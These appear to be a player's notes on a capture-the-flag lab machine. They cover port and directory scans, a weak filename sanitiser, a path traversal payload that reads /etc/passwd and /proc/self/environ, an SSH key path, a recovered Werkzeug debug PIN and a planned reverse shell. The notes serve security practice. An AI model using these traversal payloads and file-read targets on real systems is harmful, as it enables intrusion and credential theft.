```
10.10.11.164
```
## Nmap Results
<pre style="font-size: 12px";>
$ sudo nmap -sC -sV -oA nmap/opensource $IP
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<font color=red>22/tcp</font> open  ssh    <font color=red> OpenSSH 7.6p1</font> Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
<font color=red>80/tcp </font>open  http    <font color=red>Werkzeug/2.1.2</font> Python/3.10.3
<font color=red>3000/tcp</font> filtered ppp
</pre>
## File and Directory Scanning
<pre style="font-size: 12px";>
$ dirb http://10.10.11.164/
+ http://10.10.11.164/<font color=red>console</font> (CODE:200|SIZE:1563)
+ http://10.10.11.164/<font color=red>download</font> (CODE:200|SIZE:2489147)
</pre>

Code that strips `../`:
```python
"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

(omitted)

"""
Recursively replace a pattern in a string
"""
def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

`/etc/passwd` respond:
<pre style="font-size: 12px";>
HTTP/1.1 304 NOT MODIFIED
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sun, 24 Jul 2022 08:13:04 GMT
Content-Disposition: inline; filename=passwd
Cache-Control: no-cache
ETag: "1631819611.0-1172-430441564"
Date: Sun, 24 Jul 2022 08:13:04 GMT
Connection: close
</pre>

`/proc/self/environ` respond:
<pre style="font-size: 12px";>
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sun, 24 Jul 2022 08:14:28 GMT
Content-Disposition: inline; filename=environ
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Sun, 24 Jul 2022 08:07:44 GMT
Cache-Control: no-cache
ETag: "1658650064.906572-0-1118308124"
Date: Sun, 24 Jul 2022 08:14:28 GMT
Connection: close
</pre>

/home/43ccb766088e/.ssh/id_rsa

Uploaded file is located at `/app/public/uploads/[file]` on the system.

## Attack Vector
> retired box Backend & BackendTwo (public WP available) helps in final foothold.

1. 80 HTTP. We can do LFI, ex: `uploads/%2E%2E%2F/etc/passwd` 
	1. **RE the pin?** possible if you can read arbitrary files in the system. (https://ctftime.org/writeup/17955).  Note: Very close, we just need to find the machine-id. PIN: 691-398-360
	2. **Reverse shell**? upload a code in the system and run it with LFI?
2. 22 SSH → nothing's interesting. 
3. 3000 ppp → ???


Questions:
1. how does `..//` give us LFI?